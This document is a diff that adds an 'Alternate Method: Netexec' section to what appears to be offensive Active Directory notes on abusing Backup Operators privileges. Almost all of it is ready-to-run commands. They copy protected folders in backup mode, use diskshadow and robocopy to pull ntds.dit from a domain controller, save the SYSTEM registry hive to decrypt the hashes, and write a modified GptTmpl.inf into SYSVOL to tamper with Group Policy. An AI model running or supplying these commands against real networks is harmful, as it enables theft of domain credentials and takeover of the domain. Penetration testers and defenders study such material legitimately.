@@ -74,3 +74,35 @@ and add whatever you want in it
 
         robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB
    
+
+## Alternate Method: Netexec
+
+### 1) Backup a folder content
+
+    nxc smb <target> -u user1 -p password -X "robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E"
+
+### 2) Backup with diskshadow + robocopy
+
+Create the script.txt, then backup with diskshadow with Netexec
+
+    nxc smb <target> -u user1 -p password -X "diskshadow /s script.txt"
+
+Retrieve the backup with robovopy and send the NTDS file in the current folder
+
+    nxc smb <target> -u user1 -p password -X "robocopy /B E:\Windows\ntds . ntds.dit"
+
+Then retrieve the SYSTEM registry hive to decrypt and profit
+
+    reg save hklm\system c:\temp\system
+
+### 3) GPOs read/write rights
+
+Normally the Backup Operators can read and rights all the domain and DC GPOs with robocopy in backup mode
+
+Found the interesting GPO with Get-NetGPO . For example Default Domain Policy in the Domain Controller policy
+
+Get the file at the path \\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf and add whatever you want in it
+
+Write the file with robocopy:
+
+    nxc smb <target> -u user1 -p password -X 'robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB'
